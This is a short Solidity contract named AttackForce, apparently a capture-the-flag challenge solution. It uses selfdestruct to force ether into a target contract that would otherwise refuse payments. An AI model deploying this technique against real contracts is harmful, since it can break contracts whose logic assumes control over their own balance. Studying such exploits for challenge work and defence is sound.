// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {

    receive() external payable {}

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

}